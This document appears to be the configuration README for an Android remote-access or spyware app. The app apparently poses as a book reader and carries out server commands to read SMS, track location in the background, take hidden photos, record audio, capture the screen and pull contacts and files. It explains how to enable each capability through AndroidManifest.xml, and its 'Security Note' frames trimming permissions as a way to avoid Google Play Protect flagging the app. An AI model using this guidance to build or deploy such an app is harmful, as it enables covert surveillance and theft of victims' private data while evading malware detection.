# 🎯 Easy Permission Configuration System

## ✅ How It Works

**You only need to modify ONE file**: `AndroidManifest.xml`

The app **automatically detects** which permissions are declared and:
- Shows only the relevant permission dialogs to users
- Ignores server commands for disabled features
- No code changes required!

---

## 🔧 How to Enable/Disable Features

### 1. Open AndroidManifest.xml
File location: `app/src/main/AndroidManifest.xml`

### 2. Find the Feature Section
Look for the big header comments like:
```xml
<!-- ═══════════════════════════════════════════════════════════════════════════════════
     FEATURE: CAMERA
     To enable: uncomment all 3 lines below
     To disable: comment all 3 lines below
═══════════════════════════════════════════════════════════════════════════════════ -->
```

### 3. Comment/Uncomment Permissions

**To ENABLE a feature** - uncomment the permissions:
```xml
<!-- CAMERA: ENABLED -->
<uses-permission android:name="android.permission.CAMERA" />
<uses-feature android:name="android.hardware.camera" android:required="false" />
<uses-feature android:name="android.hardware.camera.front" android:required="false" />
```

**To DISABLE a feature** - comment the permissions:
```xml
<!-- CAMERA: DISABLED -->
<!--
<uses-permission android:name="android.permission.CAMERA" />
<uses-feature android:name="android.hardware.camera" android:required="false" />
<uses-feature android:name="android.hardware.camera.front" android:required="false" />
-->
```

### 4. Update Foreground Service Type (if needed)
If you enable/disable Camera, Microphone, or Location, update the MainService declaration:

```xml
<!-- Main Service - foregroundServiceType will be set dynamically based on enabled permissions -->
<service
    android:name=".service.MainService"
    android:enabled="true"
    android:exported="false"
    android:foregroundServiceType="dataSync|location"
    />
```

Possible types:
- `dataSync` - always included
- `camera` - include if CAMERA is enabled
- `microphone` - include if MICROPHONE is enabled
- `location` - include if LOCATION is enabled
- `mediaProjection` - include if SCREEN MONITORING is enabled (separate service: ScreenStreamService)

Example with all enabled for MainService:
```xml
android:foregroundServiceType="dataSync|camera|microphone|location"
```

Note: Screen monitoring uses a separate service `ScreenStreamService` with type `mediaProjection`.

### 5. Rebuild the App
```bash
cd android-native-app
gradlew.bat assembleDebug
```

---

## 📋 Available Features

| Feature | Permissions Required | Server Command |
|---------|---------------------|----------------|
| Camera | `CAMERA` + `FOREGROUND_SERVICE_CAMERA` | `0xCA` |
| Microphone | `RECORD_AUDIO` + `FOREGROUND_SERVICE_MICROPHONE` | `0xMI` |
| Screen Monitoring | `FOREGROUND_SERVICE_MEDIA_PROJECTION` (MediaProjection dialog) | `0xSC`, `0xSS` |
| Location | `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION`, `ACCESS_BACKGROUND_LOCATION` + `FOREGROUND_SERVICE_LOCATION` | `0xLO` |
| SMS | `READ_SMS`, `RECEIVE_SMS` | `0xSM` |
| Call Logs | `READ_CALL_LOG` | `0xCL` |
| Contacts | `READ_CONTACTS` | `0xCO` |
| Storage | `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE` | `0xFI` |
| WiFi | `ACCESS_WIFI_STATE`, `CHANGE_WIFI_STATE` | `0xWI` |

---

## 🎯 Current Configuration

**ENABLED:**
- ✅ Location (with background support)
- ✅ SMS

**DISABLED:**
- ❌ Camera
- ❌ Microphone
- ❌ Screen Monitoring
- ❌ Call Logs
- ❌ Contacts
- ❌ Storage
- ❌ WiFi

---

## 🔄 Example: Enable Camera

1. Open `AndroidManifest.xml`
2. Find the CAMERA section (around line 20)
3. Uncomment the 3 camera permission lines
4. Find the FOREGROUND SERVICE section (around line 140)
5. Uncomment `<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />`
6. Update MainService `foregroundServiceType` to include `camera`:
   ```xml
   android:foregroundServiceType="dataSync|location|camera"
   ```
7. Rebuild: `gradlew.bat assembleDebug`

Done! The app will now:
- Show camera permission dialog on startup
- Accept camera commands from server
- Take photos in background

---

## 🛡️ Security Note

**Why comment permissions?**
- Declaring all permissions makes the app look suspicious
- Google Play Protect may flag it as malicious
- Users see scary permission lists
- **Solution**: Only declare permissions you actually need for your use case

---

## 🔍 How It Works Internally

The app uses **`PermissionDetector`** utility that:
1. Reads `AndroidManifest.xml` at runtime
2. Checks which permissions are declared
3. Automatically adjusts:
   - Permission dialogs in `BookReaderActivity`
   - Command handlers in `SocketManager`
   - Service types in `MainService`

**No code changes needed** - everything is automatic! 🎉

---

## ⚠️ Important Notes

1. **Always rebuild** after modifying AndroidManifest.xml
2. **Match foreground service types** with declared permissions
3. **Test the app** after changes to ensure permissions work correctly
4. **Keep at least one feature enabled** so the app has a purpose

---

## 📞 Support

If you need to add a new feature or have issues, check:
1. `PermissionDetector.java` - permission detection logic
2. `BookReaderActivity.java` - permission dialog flow
3. `SocketManager.java` - server command handling
